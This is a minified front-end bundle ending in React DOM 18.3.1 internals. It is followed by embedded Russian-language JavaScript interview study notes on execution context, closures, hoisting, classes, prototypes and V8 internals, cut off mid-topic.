Error(v(306,r,""))}return t;case 0:return r=t.type,o=t.pendingProps,o=t.elementType===r?o:Re(r,o),Rl(e,t,r,o,n);case 1:return r=t.type,o=t.pendingProps,o=t.elementType===r?o:Re(r,o),Os(e,t,r,o,n);case 3:e:{if(_u(t),e===null)throw Error(v(387));r=t.pendingProps,l=t.memoizedState,o=l.element,su(e,t),Kr(t,r,null,n);var i=t.memoizedState;if(r=i.element,l.isDehydrated)if(l={element:r,isDehydrated:!1,cache:i.cache,pendingSuspenseBoundaries:i.pendingSuspenseBoundaries,transitions:i.transitions},t.updateQueue.baseState=l,t.memoizedState=l,t.flags&256){o=rn(Error(v(423)),t),t=Ls(e,t,r,n,o);break e}else if(r!==o){o=rn(Error(v(424)),t),t=Ls(e,t,r,n,o);break e}else for(he=it(t.stateNode.containerInfo.firstChild),ge=t,z=!0,Me=null,n=lu(t,null,r,n),t.child=n;n;)n.flags=n.flags&-3|4096,n=n.sibling;else{if(en(),r===o){t=Ge(e,t,n);break e}le(e,t,r,n)}t=t.child}return t;case 5:return au(t),e===null&&Tl(t),r=t.type,o=t.pendingProps,l=e!==null?e.memoizedProps:null,i=o.children,yl(r,o)?i=null:l!==null&&yl(r,l)&&(t.flags|=32),Du(e,t),le(e,t,i,n),t.child;case 6:return e===null&&Tl(t),null;case 13:return Iu(e,t,n);case 4:return hi(t,t.stateNode.containerInfo),r=t.pendingProps,e===null?t.child=tn(t,null,r,n):le(e,t,r,n),t.child;case 11:return r=t.type,o=t.pendingProps,o=t.elementType===r?o:Re(r,o),Ns(e,t,r,o,n);case 7:return le(e,t,t.pendingProps,n),t.child;case 8:return le(e,t,t.pendingProps.children,n),t.child;case 12:return le(e,t,t.pendingProps.children,n),t.child;case 10:e:{if(r=t.type._context,o=t.pendingProps,l=t.memoizedProps,i=o.value,_(Jr,r._currentValue),r._currentValue=i,l!==null)if(_e(l.value,i)){if(l.children===o.children&&!de.current){t=Ge(e,t,n);break e}}else for(l=t.child,l!==null&&(l.return=t);l!==null;){var s=l.dependencies;if(s!==null){i=l.child;for(var a=s.firstContext;a!==null;){if(a.context===r){if(l.tag===1){a=Je(-1,n&-n),a.tag=2;var c=l.updateQueue;if(c!==null){c=c.shared;var p=c.pending;p===null?a.next=a:(a.next=p.next,p.next=a),c.pending=a}}l.lanes|=n,a=l.alternate,a!==null&&(a.lanes|=n),xl(l.return,n,t),s.lanes|=n;break}a=a.next}}else if(l.tag===10)i=l.type===t.type?null:l.child;else if(l.tag===18){if(i=l.return,i===null)throw Error(v(341));i.lanes|=n,s=i.alternate,s!==null&&(s.lanes|=n),xl(i,n,t),i=l.sibling}else i=l.child;if(i!==null)i.return=l;else for(i=l;i!==null;){if(i===t){i=null;break}if(l=i.sibling,l!==null){l.return=i.return,i=l;break}i=i.return}l=i}le(e,t,o.children,n),t=t.child}return t;case 9:return o=t.type,r=t.pendingProps.children,Xt(t,n),o=xe(o),r=r(o),t.flags|=1,le(e,t,r,n),t.child;case 14:return r=t.type,o=Re(r,t.pendingProps),o=Re(r.type,o),Ms(e,t,r,o,n);case 15:return Ou(e,t,t.type,t.pendingProps,n);case 17:return r=t.type,o=t.pendingProps,o=t.elementType===r?o:Re(r,o),jr(e,t),t.tag=1,fe(r)?(e=!0,Wr(t)):e=!1,Xt(t,n),Ru(t,r,o),Pl(t,r,o,n),Nl(null,t,r,!0,e,n);case 19:return Au(e,t,n);case 22:return Lu(e,t,n)}throw Error(v(156,t.tag))};function Zu(e,t){return Ea(e,t)}function Pf(e,t,n,r){this.tag=e,this.key=n,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.ref=null,this.pendingProps=t,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=r,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function Ce(e,t,n,r){return new Pf(e,t,n,r)}function Mi(e){return e=e.prototype,!(!e||!e.isReactComponent)}function jf(e){if(typeof e=="function")return Mi(e)?1:0;if(e!=null){if(e=e.$$typeof,e===bl)return 11;if(e===Xl)return 14}return 2}function ct(e,t){var n=e.alternate;return n===null?(n=Ce(e.tag,t,e.key,e.mode),n.elementType=e.elementType,n.type=e.type,n.stateNode=e.stateNode,n.alternate=e,e.alternate=n):(n.pendingProps=t,n.type=e.type,n.flags=0,n.subtreeFlags=0,n.deletions=null),n.flags=e.flags&14680064,n.childLanes=e.childLanes,n.lanes=e.lanes,n.child=e.child,n.memoizedProps=e.memoizedProps,n.memoizedState=e.memoizedState,n.updateQueue=e.updateQueue,t=e.dependencies,n.dependencies=t===null?null:{lanes:t.lanes,firstContext:t.firstContext},n.sibling=e.sibling,n.index=e.index,n.ref=e.ref,n}function Mr(e,t,n,r,o,l){var i=2;if(r=e,typeof e=="function")Mi(e)&&(i=1);else if(typeof e=="string")i=5;else e:switch(e){case It:return xt(n.children,o,l,t);case Gl:i=8,o|=8;break;case Xo:return e=Ce(12,n,t,o|2),e.elementType=Xo,e.lanes=l,e;case Yo:return e=Ce(13,n,t,o),e.elementType=Yo,e.lanes=l,e;case Zo:return e=Ce(19,n,t,o),e.elementType=Zo,e.lanes=l,e;case aa:return mo(n,o,l,t);default:if(typeof e=="object"&&e!==null)switch(e.$$typeof){case ia:i=10;break e;case sa:i=9;break e;case bl:i=11;break e;case Xl:i=14;break e;case Ye:i=16,r=null;break e}throw Error(v(130,e==null?e:typeof e,""))}return t=Ce(i,n,t,o),t.elementType=e,t.type=r,t.lanes=l,t}function xt(e,t,n,r){return e=Ce(7,e,r,t),e.lanes=n,e}function mo(e,t,n,r){return e=Ce(22,e,r,t),e.elementType=aa,e.lanes=n,e.stateNode={isHidden:!1},e}function Ko(e,t,n){return e=Ce(6,e,null,t),e.lanes=n,e}function Qo(e,t,n){return t=Ce(4,e.children!==null?e.children:[],e.key,t),t.lanes=n,t.stateNode={containerInfo:e.containerInfo,pendingChildren:null,implementation:e.implementation},t}function Rf(e,t,n,r,o){this.tag=t,this.containerInfo=e,this.finishedWork=this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.pendingContext=this.context=null,this.callbackPriority=0,this.eventTimes=jo(0),this.expirationTimes=jo(-1),this.entangledLanes=this.finishedLanes=this.mutableReadLanes=this.expiredLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=jo(0),this.identifierPrefix=r,this.onRecoverableError=o,this.mutableSourceEagerHydrationData=null}function Oi(e,t,n,r,o,l,i,s,a){return e=new Rf(e,t,n,s,a),t===1?(t=1,l===!0&&(t|=8)):t=0,l=Ce(3,null,null,t),e.current=l,l.stateNode=e,l.memoizedState={element:r,isDehydrated:n,cache:null,transitions:null,pendingSuspenseBoundaries:null},mi(l),e}function Nf(e,t,n){var r=3<arguments.length&&arguments[3]!==void 0?arguments[3]:null;return{$$typeof:_t,key:r==null?null:""+r,children:e,containerInfo:t,implementation:n}}function qu(e){if(!e)return ft;e=e._reactInternals;e:{if(Ot(e)!==e||e.tag!==1)throw Error(v(170));var t=e;do{switch(t.tag){case 3:t=t.stateNode.context;break e;case 1:if(fe(t.type)){t=t.stateNode.__reactInternalMemoizedMergedChildContext;break e}}t=t.return}while(t!==null);throw Error(v(171))}if(e.tag===1){var n=e.type;if(fe(n))return qa(e,n,t)}return t}function ec(e,t,n,r,o,l,i,s,a){return e=Oi(n,r,!0,e,o,l,i,s,a),e.context=qu(null),n=e.current,r=ie(),o=ut(n),l=Je(r,o),l.callback=t??null,st(n,l,o),e.current.lanes=o,Xn(e,o,r),pe(e,r),e}function ho(e,t,n,r){var o=t.current,l=ie(),i=ut(o);return n=qu(n),t.context===null?t.context=n:t.pendingContext=n,t=Je(l,i),t.payload={element:e},r=r===void 0?null:r,r!==null&&(t.callback=r),e=st(o,t,i),e!==null&&(De(e,o,i,l),xr(e,o,i)),i}function eo(e){if(e=e.current,!e.child)return null;switch(e.child.tag){case 5:return e.child.stateNode;default:return e.child.stateNode}}function Vs(e,t){if(e=e.memoizedState,e!==null&&e.dehydrated!==null){var n=e.retryLane;e.retryLane=n!==0&&n<t?n:t}}function Li(e,t){Vs(e,t),(e=e.alternate)&&Vs(e,t)}function Mf(){return null}var tc=typeof reportError=="function"?reportError:function(e){console.error(e)};function Di(e){this._internalRoot=e}go.prototype.render=Di.prototype.render=function(e){var t=this._internalRoot;if(t===null)throw Error(v(409));ho(e,t,null,null)};go.prototype.unmount=Di.prototype.unmount=function(){var e=this._internalRoot;if(e!==null){this._internalRoot=null;var t=e.containerInfo;Nt(function(){ho(null,e,null,null)}),t[Ke]=null}};function go(e){this._internalRoot=e}go.prototype.unstable_scheduleHydration=function(e){if(e){var t=La();e={blockedOn:null,target:e,priority:t};for(var n=0;n<qe.length&&t!==0&&t<qe[n].priority;n++);qe.splice(n,0,e),n===0&&_a(e)}};function _i(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11)}function vo(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11&&(e.nodeType!==8||e.nodeValue!==" react-mount-point-unstable "))}function Bs(){}function Of(e,t,n,r,o){if(o){if(typeof r=="function"){var l=r;r=function(){var c=eo(i);l.call(c)}}var i=ec(t,r,e,0,null,!1,!1,"",Bs);return e._reactRootContainer=i,e[Ke]=i.current,Un(e.nodeType===8?e.parentNode:e),Nt(),i}for(;o=e.lastChild;)e.removeChild(o);if(typeof r=="function"){var s=r;r=function(){var c=eo(a);s.call(c)}}var a=Oi(e,0,!1,null,null,!1,!1,"",Bs);return e._reactRootContainer=a,e[Ke]=a.current,Un(e.nodeType===8?e.parentNode:e),Nt(function(){ho(t,a,n,r)}),a}function yo(e,t,n,r,o){var l=n._reactRootContainer;if(l){var i=l;if(typeof o=="function"){var s=o;o=function(){var a=eo(i);s.call(a)}}ho(t,i,e,o)}else i=Of(n,t,e,o,r);return eo(i)}Ma=function(e){switch(e.tag){case 3:var t=e.stateNode;if(t.current.memoizedState.isDehydrated){var n=kn(t.pendingLanes);n!==0&&(ql(t,n|1),pe(t,$()),!(L&6)&&(on=$()+500,ht()))}break;case 13:Nt(function(){var r=Qe(e,1);if(r!==null){var o=ie();De(r,e,1,o)}}),Li(e,1)}};ei=function(e){if(e.tag===13){var t=Qe(e,134217728);if(t!==null){var n=ie();De(t,e,134217728,n)}Li(e,134217728)}};Oa=function(e){if(e.tag===13){var t=ut(e),n=Qe(e,t);if(n!==null){var r=ie();De(n,e,t,r)}Li(e,t)}};La=function(){return D};Da=function(e,t){var n=D;try{return D=e,t()}finally{D=n}};al=function(e,t,n){switch(t){case"input":if(tl(e,n),t=n.name,n.type==="radio"&&t!=null){for(n=e;n.parentNode;)n=n.parentNode;for(n=n.querySelectorAll("input[name="+JSON.stringify(""+t)+'][type="radio"]'),t=0;t<n.length;t++){var r=n[t];if(r!==e&&r.form===e.form){var o=so(r);if(!o)throw Error(v(90));ca(r),tl(r,o)}}}break;case"textarea":fa(e,n);break;case"select":t=n.value,t!=null&&Kt(e,!!n.multiple,t,!1)}};Sa=ji;wa=Nt;var Lf={usingClientEntryPoint:!1,Events:[Zn,Ht,so,va,ya,ji]},yn={findFiberByHostInstance:wt,bundleType:0,version:"18.3.1",rendererPackageName:"react-dom"},Df={bundleType:yn.bundleType,version:yn.version,rendererPackageName:yn.rendererPackageName,rendererConfig:yn.rendererConfig,overrideHookState:null,overrideHookStateDeletePath:null,overrideHookStateRenamePath:null,overrideProps:null,overridePropsDeletePath:null,overridePropsRenamePath:null,setErrorHandler:null,setSuspenseHandler:null,scheduleUpdate:null,currentDispatcherRef:be.ReactCurrentDispatcher,findHostInstanceByFiber:function(e){return e=Ta(e),e===null?null:e.stateNode},findFiberByHostInstance:yn.findFiberByHostInstance||Mf,findHostInstancesForRefresh:null,scheduleRefresh:null,scheduleRoot:null,setRefreshHandler:null,getCurrentFiber:null,reconcilerVersion:"18.3.1-next-f1338f8080-20240426"};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<"u"){var yr=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!yr.isDisabled&&yr.supportsFiber)try{ro=yr.inject(Df),ze=yr}catch{}}ye.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=Lf;ye.createPortal=function(e,t){var n=2<arguments.length&&arguments[2]!==void 0?arguments[2]:null;if(!_i(t))throw Error(v(200));return Nf(e,t,null,n)};ye.createRoot=function(e,t){if(!_i(e))throw Error(v(299));var n=!1,r="",o=tc;return t!=null&&(t.unstable_strictMode===!0&&(n=!0),t.identifierPrefix!==void 0&&(r=t.identifierPrefix),t.onRecoverableError!==void 0&&(o=t.onRecoverableError)),t=Oi(e,1,!1,null,null,n,!1,r,o),e[Ke]=t.current,Un(e.nodeType===8?e.parentNode:e),new Di(t)};ye.findDOMNode=function(e){if(e==null)return null;if(e.nodeType===1)return e;var t=e._reactInternals;if(t===void 0)throw typeof e.render=="function"?Error(v(188)):(e=Object.keys(e).join(","),Error(v(268,e)));return e=Ta(t),e=e===null?null:e.stateNode,e};ye.flushSync=function(e){return Nt(e)};ye.hydrate=function(e,t,n){if(!vo(t))throw Error(v(200));return yo(null,e,t,!0,n)};ye.hydrateRoot=function(e,t,n){if(!_i(e))throw Error(v(405));var r=n!=null&&n.hydratedSources||null,o=!1,l="",i=tc;if(n!=null&&(n.unstable_strictMode===!0&&(o=!0),n.identifierPrefix!==void 0&&(l=n.identifierPrefix),n.onRecoverableError!==void 0&&(i=n.onRecoverableError)),t=ec(t,null,e,1,n??null,o,!1,l,i),e[Ke]=t.current,Un(e),r)for(e=0;e<r.length;e++)n=r[e],o=n._getVersion,o=o(n._source),t.mutableSourceEagerHydrationData==null?t.mutableSourceEagerHydrationData=[n,o]:t.mutableSourceEagerHydrationData.push(n,o);return new go(t)};ye.render=function(e,t,n){if(!vo(t))throw Error(v(200));return yo(null,e,t,!1,n)};ye.unmountComponentAtNode=function(e){if(!vo(e))throw Error(v(40));return e._reactRootContainer?(Nt(function(){yo(null,null,e,!1,function(){e._reactRootContainer=null,e[Ke]=null})}),!0):!1};ye.unstable_batchedUpdates=ji;ye.unstable_renderSubtreeIntoContainer=function(e,t,n,r){if(!vo(n))throw Error(v(200));if(e==null||e._reactInternals===void 0)throw Error(v(38));return yo(e,t,n,!1,r)};ye.version="18.3.1-next-f1338f8080-20240426";function nc(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(nc)}catch(e){console.error(e)}}nc(),na.exports=ye;var _f=na.exports,Js=_f;Go.createRoot=Js.createRoot,Go.hydrateRoot=Js.hydrateRoot;const to={1:{label:"INTERN",color:"#8b949e"},2:{label:"JUNIOR",color:"#3fb950"},3:{label:"MIDDLE",color:"#d29922"},4:{label:"SENIOR",color:"#f85149"}},If=[{id:"js",title:"JS",icon:"⚡",color:"#F0DB4F",topics:[{name:"Определение контекста выполнения, случаи применения",level:"2",content:`**Контекст выполнения (Execution Context)** — структура, которая создаётся при каждом вызове функции.

Состоит из двух компонентов:
• **Lexical Environment** — для \`let\`, \`const\`, function declarations
• **Variable Environment** — для \`var\`

**this определяется способом вызова функции, НЕ местом объявления.**

Способы вызова и значение this:
\`\`\`js
obj.method()        // this = obj (метод объекта)
func()              // this = window / undefined (свободный вызов)
func.call(ctx)      // this = ctx (явная привязка)
func.apply(ctx)     // this = ctx (явная привязка)
func.bind(ctx)()    // this = ctx (жёсткая привязка)
new Func()          // this = новый объект
\`\`\`

**Шаги оператора new:**
1. Создаётся пустой объект \`{}\`
2. \`__proto__\` нового объекта → \`Function.prototype\`
3. \`this\` внутри функции указывает на новый объект
4. Выполняется тело функции
5. Если return объект → вернётся он; если примитив/ничего → свой объект`,score:3.5},{name:"Вычисление контекста, его значение по умолчанию",level:"2",content:"**Reference Type** — внутренний тип спецификации. При вычислении `obj.method` движок получает:\n```\n{ base: obj, name: 'method', strict: false }\n```\n\n**GetValue()** — внутренняя операция, которая извлекает значение из Reference Type, уничтожая base.\n\nВызывается при: присваивании (`=`), логических операторах (`||`, `&&`), операторе запятая.\n**НЕ вызывается** при группировке `()`.\n\n```js\nobj.method()              // Reference Type жив → this = obj\n(obj.method)()            // группировка не ломает → this = obj\n(obj.method = obj.method)() // присваивание → GetValue() → this = window\n(false || obj.method)()   // || → GetValue() → this = window\n```\n\n**Boxing (нестрогий режим):**\n• `null` / `undefined` → `window`\n• Примитив → обёртка: `7` → `Number{7}`\n\n```js\nfunction foo() { console.log(this); }\n\n// Нестрогий режим:\nfoo.call(null);      // this → window\nfoo.call(undefined); // this → window\nfoo.call(7);         // this → Number {7}  ← boxing!\nfoo.call('hi');      // this → String {'hi'} ← boxing!\n\n// Strict mode — boxing не происходит:\nfoo.call(7);         // this → 7 (просто примитив)\nfoo.call(null);      // this → null\n```\n\n**Правило:** нестрогий → null/undefined заменяются на window, примитивы оборачиваются в объект. Строгий → что передал, то и получил.",score:2.5},{name:"Сохранение контекста выполнения через замыкание",level:"2",content:`**Замыкание** — функция + её ссылка \`[[Environment]]\` на лексическое окружение, в котором она была создана.

**\`[[Environment]]\`** — скрытое свойство каждой функции, устанавливается в момент **СОЗДАНИЯ** (не вызова!).

Сборщик мусора не удаляет лексическое окружение, пока на него есть ссылка из \`[[Environment]]\`.

**Приём const self = this:**
\`\`\`js
function Timer() {
  this.seconds = 0;
  const self = this; // сохраняем через замыкание
  setInterval(function() {
    self.seconds++;
  }, 1000);
}
\`\`\`

**Классическая задача var + цикл:**
\`\`\`js
for (var i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 1000);
} // 3, 3, 3

// Решение 1: IIFE
for (var i = 0; i < 3; i++) {
  (function(j) {
    setTimeout(() => console.log(j), 1000);
  })(i);
}

// Решение 2: let
for (let i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 1000);
} // 0, 1, 2 — спецификация for+let создаёт новое ЛО на каждую итерацию
\`\`\``,score:3},{name:"Потеря контекста",level:"2",content:`**3 случая потери контекста:**

1. **Присваивание метода в переменную:**
\`\`\`js
const fn = obj.greet; // GetValue() → base потерян
fn(); // this = window/undefined
\`\`\`

2. **Передача метода как колбэка:**
\`\`\`js
setTimeout(obj.greet, 1000); // GetValue() → base потерян
\`\`\`

3. **Вложенная функция внутри метода:**
\`\`\`js
const obj = {
  method() {
    function inner() {
      console.log(this); // window — inner имеет base = ЛО (не объект)
    }
    inner();
  }
};
\`\`\`

**4 способа исправить:**
1. **Стрелочная функция** — не создаёт свой this
2. **bind** — возвращает функцию с привязанным this
3. **const self = this** — замыкание
4. **call/apply** — для немедленного вызова`,score:4},{name:"Виды объявления переменных, Function declaration и Function expression, NFE, IIFE",level:"2",content:`**var**: область видимости — функция/скрипт, всплывает с \`undefined\`
**let/const**: область видимости — блок, всплывает как \`uninitialized\` (TDZ)

**Function Declaration vs Expression:**
• FD — полностью всплывает (можно вызвать до объявления)
• FE — следует правилам переменной, в которую присвоен

**Приоритет при одном имени:** function declaration перезаписывает var при всплытии.

**NFE (Named Function Expression):**
\`\`\`js
const sayHi = function greeting() {
  // greeting доступно только здесь
  // хранится в промежуточном ЛО как immutable
  // Перезаписать нельзя
};
greeting(); // ReferenceError — снаружи не видно
\`\`\`
Зачем: надёжная рекурсия (не зависит от внешней переменной) + отладка (имя в stack trace).

**IIFE:** Создаёт изолированную область видимости. До ES6 — основной инструмент модульности. Сейчас заменён \`let/const\`, блоками, модулями.`,score:3.5},{name:"Всплытие переменных",level:"2",content:`Движок проходит код дважды:
1. **Регистрация** — var → \`undefined\`, let/const → \`uninitialized\`, FD → полностью
2. **Выполнение** — построчно

**TDZ (Temporal Dead Zone):** промежуток от начала блока до строки объявления let/const. Обращение → ReferenceError.

\`\`\`js
let x = 'outer';
{
  console.log(x); // ReferenceError, НЕ 'outer'!
  let x = 'inner'; // TS знает о нём с начала блока
}
\`\`\`

**function declaration внутри блока:**
• Нестрогий режим: всплывает только имя как var (\`undefined\`), функция не поднимается
• Strict mode: блочная видимость, не всплывает наружу вообще

**Разница ЛО блока и функции:**
• Функция: Lexical Environment + Variable Environment
• Блок: только Lexical Environment (var пролетает мимо блока)`,score:4},{name:"Что такое замыкание?",level:"2",content:"**Замыкание** — сама функция вместе с её ссылкой `[[Environment]]` на лексическое окружение, в котором она была создана.\n\nТехнически **каждая** функция в JS — замыкание, потому что каждая получает `[[Environment]]`. Заметно когда внутренняя функция живёт дольше внешней.\n\n**Механика:**\n1. Функция создаётся → получает `[[Environment]]` → ссылка на текущее ЛО\n2. Функция вызывается → создаётся новое ЛО, `outer` = `[[Environment]]`\n3. Поиск переменных идёт по цепочке `outer`\n4. `[[Environment]]` уже не участвует — он сделал своё дело на шаге 2\n\nСборщик мусора не удаляет ЛО, пока на него ссылается `[[Environment]]` живой функции.",score:4},{name:"Определение класса. Синтаксис классов. Наследование",level:"2",content:`**typeof class = "function"** — синтаксический сахар.

**Отличия class от функции-конструктора:**
1. Без \`new\` — TypeError
2. Методы неперечислимые
3. Всегда strict mode
4. Не всплывает

**extends создаёт ДВЕ цепочки:**
\`\`\`js
Admin.prototype.__proto__ === User.prototype // для экземпляров
Admin.__proto__ === User                     // для статики
\`\`\`

**super():**
• В конструкторе — вызывает конструктор родителя, создаёт this
• В методе — обращается к методу родительского прототипа
• Без super() в дочернем конструкторе — ReferenceError при обращении к this

**User.prototype** по умолчанию = \`{ constructor: User }\`

**Приватные методы:**
\`\`\`js
class User {
  #name;
  constructor(name) { this.#name = name; }
  #validate() { return this.#name.length > 0; }
  getName() { return this.#validate() ? this.#name : null; }
}
\`\`\`

**Порядок инициализации полей:**
1. Поля родителя (class fields)
2. Конструктор родителя (super())
3. Поля дочернего класса
4. Конструктор дочернего класса

**Mixin-паттерн** (псевдо-множественное наследование):
\`\`\`js
const Serializable = (Base) => class extends Base {
  serialize() { return JSON.stringify(this); }
};
const Validatable = (Base) => class extends Base {
  validate() { return Object.values(this).every(v => v !== null); }
};
class User extends Serializable(Validatable(EventEmitter)) { ... }
\`\`\`
Каждый mixin — функция (Base) => class extends Base. Цепочка прототипов линейна, нет diamond problem.`,score:3.5},{name:"Подмена существующего контекста",level:"2",content:`**call(ctx, a, b)** — вызывает сразу, аргументы через запятую
**apply(ctx, [a, b])** — вызывает сразу, аргументы массивом (A = Array)
**bind(ctx)** — НЕ вызывает, возвращает новую функцию

**bind привязывает навсегда.** Повторный bind/call/apply не перебьёт. Под капотом создаётся exotic object с \`[[BoundThis]]\`.

**Стрелочная функция** — подмена this НЕВОЗМОЖНА. call/apply/bind игнорируются. this ищется как переменная по \`[[Environment]]\`.

**React классовые компоненты:**
\`\`\`js
// Вариант 1: bind в конструкторе
this.handleClick = this.handleClick.bind(this);

// Вариант 2: стрелочная функция как поле класса
handleClick = () => { ... }
\`\`\``,score:3},{name:"Лексическое окружение",level:"3",content:`**Лексическое окружение (Lexical Environment)** — структура данных, хранящая:
• **Environment Record** — привязки идентификаторов к значениям
• **outer** — ссылка на внешнее ЛО

Создаётся при каждом вызове функции и для каждого блока (для let/const).

**Поиск переменных:** своё ЛО → outer → ... → глобальное ЛО → null → ReferenceError

**\`[[Environment]]\`:**
• Устанавливается в момент **создания** функции
• При вызове функции: новое ЛО, его outer = \`[[Environment]]\`

**Промежуточное ЛО у NFE:**
\`\`\`
Внутреннее ЛО функции
  ↓ outer
Промежуточное { greeting: <функция> } (immutable)
  ↓ outer
Внешнее ЛО
\`\`\``,score:4.5},{name:"Определение прототипа. Цепочка прототипов, механизм поиска свойств",level:"3",content:`**\`[[Prototype]]\`** — скрытое свойство объекта, доступно через \`__proto__\` (геттер/сеттер).

**Два механизма поиска:**
• Переменные: по цепочке outer (статически, при создании) → ReferenceError
• Свойства: по цепочке __proto__ (динамически, можно менять) → undefined

**Shadowing:** запись свойства ВСЕГДА на самом объекте, не поднимается по цепочке.

**this в методе прототипа:** неважно где метод найден, this = объект перед точкой.

\`\`\`js
hasOwnProperty('prop')  // проверка собственного свойства
for...in                // включая прототип
Object.keys()           // только собственные
\`\`\`

**Конец цепочки:** Object.prototype → null

**Object.create():**
\`\`\`js
// Создать объект с конкретным прототипом
const animal = { breathe() { return true; } };
const dog = Object.create(animal);
dog.bark = () => 'Woof';
Object.getPrototypeOf(dog) === animal; // true

// Объект без прототипа — чистый hash map (нет toString, hasOwnProperty и т.д.)
const map = Object.create(null);
map['key'] = 'value'; // никогда не конфликтует с prototype методами
\`\`\`

**Object.getPrototypeOf vs __proto__:**
\`__proto__\` — устаревший геттер/сеттер на Object.prototype.
\`Object.getPrototypeOf(obj)\` — стандартный API, используй его.
\`Object.setPrototypeOf(obj, proto)\` — изменить прототип у существующего объекта. Избегай в горячем коде: переводит объект в slow mode (V8 сбрасывает Hidden Class).`,score:4},{name:"Особенности стрелочных функций. Отличия от классических",level:"3",content:"**6 отличий:**\n1. Нет своего this — берёт из `[[Environment]]`\n2. Нет `arguments`\n3. Нельзя вызвать через `new`\n4. Нет свойства `prototype`\n5. Не может быть генератором\n6. Краткий синтаксис\n\nthis внутри стрелочной функции **есть** и работает, но она не создаёт **свой**. Ищет как обычную переменную по цепочке ЛО.\n\n`call/apply/bind` полностью **игнорируются** — подменить this невозможно.",score:4},{name:"Принципы работы сборщика мусора в V8",level:"4",content:`**Принцип достижимости (reachability):** всё, до чего можно добраться от корней — живое.

**Корни (roots):**
1. Глобальный объект (window/global)
2. Стек вызовов (локальные переменные выполняющихся функций)
3. Замыкания (ЛО со ссылками из живых функций)

**Два поколения памяти:**

**Young Generation → Scavenger (Minor GC):**
• Маленькая область для новых объектов
• Два полупространства: from-space и to-space
• Живые копируются в to-space, from-space очищается, роли меняются
• Быстрый, частый

**Old Generation → Mark-Sweep-Compact (Major GC):**
• Mark — помечает живые от корней
• Sweep — освобождает непомеченные
• Compact — уплотняет, убирая фрагментацию
• Медленный, редкий

**Promotion:** объект пережил 2 сборки в Young → Old

**Оптимизации пауз GC в V8:**
• Incremental Marking:
Фаза Mark в Mark-Sweep-Compact — самая долгая, потому что нужно обойти весь граф объектов от корней. Вместо того чтобы делать это за один раз и блокировать основной поток на десятки-сотни миллисекунд, V8 разбивает обход на маленькие порции по 5-10мс. Между порциями выполняется JavaScript. Проблема — пока мы помечали объекты порциями, JS-код мог создать новые ссылки или удалить старые. Для этого используется write barrier — при каждой записи свойства V8 отмечает изменённые объекты и перепроверяет их при следующей порции.
• Concurrent Marking/Sweeping/Compacting:
Фазы Sweep и Compact выполняются в отдельных потоках (worker threads), параллельно с основным JS-потоком. Основной поток продолжает выполнять JS, а воркеры в это время освобождают и уплотняют память. Начиная с 2018 года V8 также делает concurrent marking — часть фазы Mark тоже выполняется в параллельных потоках, а основной поток только финализирует результат.
• Lazy Sweeping:
После фазы Mark движок знает какие объекты мёртвые, но не торопится их очищать. Sweep происходит лениво — только когда нужно выделить новую память и текущая страница заполнена. Если памяти хватает — sweep откладывается. Это размазывает стоимость очистки во времени.
Итого эффект:
Без оптимизаций пауза Major GC могла занимать 100-500мс (заметный фриз UI). С оптимизациями — основной поток блокируется на 1-5мс за раз, остальное параллельно или инкрементально.`,score:2.5},{name:"Процесс обработки кода в V8: AST, лексический анализ, JIT, деоптимизация",level:"4",content:`**Pipeline V8:**
\`\`\`
Исходный код → Токены → AST → Байткод (Ignition) → Машинный код (TurboFan)
\`\`\`

**Процесс обработки кода в V8:**

**1. Лексический анализ (Tokenization/Lexing):**
Движок получает исходный код как текст. Первым делом разбивает его на токены — минимальные значимые единицы. Например const x = 10 + 5; → [const][x][=][10][+][5][;]. Каждый токен имеет тип (ключевое слово, идентификатор, оператор, число, пунктуация).
V8 делает это двумя способами:

Eager parsing (полный) — для кода, который нужен прямо сейчас (верхний уровень скрипта, немедленно вызываемые функции)
Lazy parsing (pre-parsing) — для тел функций, которые могут никогда не вызваться. Pre-parser не строит AST, только проверяет синтаксические ошибки и запоминает границы функции (где начинается, где заканчивается). Полный парсинг произойдёт только при первом вызове. Это критично для ускорения старта — представь бандл на 2MB JS, из которого при загрузке реально выполняется 20%.

**2. Синтаксический анализ (Parsing) → AST:**
Из плоского списка токенов строится Abstract Syntax Tree — дерево, где каждый узел представляет операцию или конструкцию. AST нужен потому что токены — плоский список, а код имеет вложенную структуру: приоритеты операций (* раньше +), вложенные блоки, scope. Дерево разрешает эти связи и позволяет дальше генерировать код и оптимизировать.

**3. Ignition (интерпретатор) → байткод:**
AST передаётся в Ignition — интерпретатор V8. Он генерирует байткод — промежуточное низкоуровневое представление, но не машинный код. Байткод генерируется быстро и выполняется сразу — это даёт быстрый старт. Пользователь видит страницу не дожидаясь тяжёлой компиляции. Параллельно Ignition собирает профилирующую информацию: какие функции вызываются часто, какие типы аргументов приходят, какие ветки if/else выполняются.

**4. TurboFan (оптимизирующий компилятор) → машинный код:**
Когда функция вызывается достаточно часто (становится «горячей»), Ignition передаёт её байткод и собранный профиль в TurboFan. TurboFan выполняет спекулятивную оптимизацию — на основе профиля предполагает типы и генерирует оптимизированный машинный код. Например, если add(a, b) 10000 раз получала числа — TurboFan генерирует машинный код для сложения чисел напрямую, без проверок типов, без boxing, с использованием CPU-инструкций для целочисленной арифметики.

**5. Деоптимизация (Deoptimization):**
Если предположения TurboFan оказались неверны (пришла строка вместо числа, объект другой формы) — оптимизированный машинный код выбрасывается, и функция возвращается к выполнению через байткод в Ignition. Это называется bailout. Функция снова работает медленно, но корректно. Ignition продолжит собирать профиль, и если увидит новую стабильную закономерность — TurboFan попробует оптимизировать заново, уже с учётом новых типов.
Практические следствия:

Мономорфный код (одни типы) → TurboFan оптимизирует → быстро
